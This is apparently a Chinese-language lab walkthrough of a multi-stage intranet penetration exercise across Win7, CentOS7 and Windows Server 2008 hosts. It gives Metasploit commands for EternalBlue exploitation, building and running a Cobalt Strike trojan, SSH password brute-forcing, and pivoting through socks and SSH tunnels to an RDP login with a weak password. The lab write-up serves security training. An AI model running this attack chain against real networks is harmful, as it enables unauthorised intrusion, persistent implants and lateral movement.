## 一、环境介绍

### 1、攻击主机

```php
# Kali
	IP：192.168.174.137
```

### 2、受害主机

```php
# Win7
	IP1：192.168.174.141
	IP2：192.168.184.140
```

```php
# Centos7
	IP1：192.168.184.142
	IP2：192.168.194.140
```

```php
# Winserver 2008
	IP：192.168.194.141
```



## 二、攻击实验

### 1、Win7

​	- 永恒之蓝

#### 		1.1、信息收集

```php
# 端口扫描
		msf6 > search portscan
		msf6 > use 5
		msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.174.141
		msf6 auxiliary(scanner/portscan/tcp) > set THREADS 40
		msf6 auxiliary(scanner/portscan/tcp) > set TIMEOUT 500
		msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
		msf6 auxiliary(scanner/portscan/tcp) > run 
		# 存在135、139、445端口
```

![image-20220531221043894](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531221043894.png)

#### 		1.2、威胁分析

```php
	445端口对应历史漏洞：永恒之蓝ms17_010
```

#### 		1.3、漏洞攻击

```php
# 漏洞检测
	msf6 auxiliary(scanner/portscan/tcp) > search ms17_010
	msf6 auxiliary(scanner/portscan/tcp) > use 3
	msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.174.141
	msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

![image-20220531224945271](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531224945271.png)

```php
# 漏洞利用
	msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
	msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.174.141
	msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

![image-20220531224957301](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531224957301.png)

#### 		1.4、权限维持

```php
# CobaltStrik 启动
	1、启动服务端
		# cd cobaltstrike4.3 
		./teamserver 192.168.174.137 1234
	2、启动客户端（另起窗口）
		# cd cobaltstrike4.3
		# ./cobaltstrike        
```

```php
# CobaltStrik 生成木马
	1、点击Attacks -> Packages -> Windows Executable 
	2、点击Listener 选择监听服务器
	3、Generate 生成木马
```

![image-20220531231625986](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531231625986.png)

![image-20220531231645611](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531231645611.png)

```php
# MSF 发送并执行木马
	meterpreter > upload /root/shell.exe C:\
	meterpreter > execute -f c:\\shell.exe
```

![image-20220531231814230](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531231814230.png)

![image-20220531231953347](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531231953347.png)

```php
# 成功上线
```

![image-20220531232047358](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531232047358.png)

#### 		1.5、内网探测

```php
# 查看路由
	meterpreter > arp -a
	# 发现存活主机192.168.184.141
```

![image-20220531232919223](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531232919223.png)

```php
# 新建路由
	msf6 exploit(windows/smb/ms17_010_eternalblue) > route add 192.168.184.141 255.255.255.0 3
```

![image-20220531232833831](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220531232833831.png)

### 2、Centos7

​	- ssh爆破

#### 		2.1、信息收集

```php
# 端口扫描
	msf6 auxiliary(scanner/ssh/ssh_login) > search portscan
	msf6 auxiliary(scanner/ssh/ssh_login) > use 5
	msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
	msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.184.142
	msf6 auxiliary(scanner/portscan/tcp) > run
	# 存在22端口
```

![image-20220601012554544](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220601012554544.png)

#### 		2.2、威胁分析

```
	22端口对应ssh服务，尝试ssh弱口令爆破
```

#### 		2.3、漏洞攻击

```php
# 选择爆破模块
	msf6 auxiliary(scanner/portscan/tcp) > search ssh_login
	msf6 auxiliary(scanner/portscan/tcp) > use 0
```

```php
# 配置爆破模块并开启攻击
	msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.184.142
	msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
	msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/legion/wordlists/ssh-password.txt
	msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 30
	msf6 auxiliary(scanner/ssh/ssh_login) > run
```

```php
# 爆破成功，切换成交互式Shell
	msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 5
	python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20220601013544155](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220601013544155.png)

#### 		2.4、内网探测

```php
# 查看路由
	[root@master ~]# arp -a
	# 发现存活主机192.168.194.141
```

![image-20220601013752692](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220601013752692.png)

```php
# 新建路由
	msf6 auxiliary(scanner/ssh/ssh_login) > route add 192.168.194.141 255.255.255.0 5
```

![image-20220601013841525](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220601013841525.png)

### 3、Winserver 2008

​	- 3389弱口令

#### 		3.1、信息收集

```php
# 端口扫描
	msf6 auxiliary(scanner/ssh/ssh_login) > search portscan
	msf6 auxiliary(scanner/ssh/ssh_login) > use 5
	msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-10000
	msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.194.141
	msf6 auxiliary(scanner/portscan/tcp) > run
	# 存在22端口
```

![image-20220601014911354](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220601014911354.png)

#### 		3.2、威胁分析

```
	3389端口为Windows远程桌面，尝试Adminitrator配合弱口令登录
```

#### 		3.3、漏洞攻击

```php
# 配置主机代理
	1、msf配置socks
		msf6 auxiliary(scanner/ssh/ssh_login) > search socks
		msf6 auxiliary(scanner/ssh/ssh_login) > use 0
		msf6 auxiliary(server/socks_proxy) > run -j
	2、kali配置socks文件中的代理端口
		# vim /etc/proxychains4.conf
			socks5 127.0.0.1 1080
```

```php
# 配置主机2ssh隧道代理
	1、kali配置ssh隧道
		# proxychains ssh -qTfnN -D 1081 root@192.168.184.142
	2、kali修改socks文件中的隧道端口
		# vim /etc/proxychains4.conf
			socks5 127.0.0.1 1081
```

```php
# 连接主机3
	1、连接并创建共享文件夹，用于传输木马等
	proxychains rdesktop -u Administrator -p QWer1234 192.168.194.141:3389 -r disk:abc=/root/
```

```php
# 连接成功
```

![image-20220601130441098](C:\Users\Toby\AppData\Roaming\Typora\typora-user-images\image-20220601130441098.png)

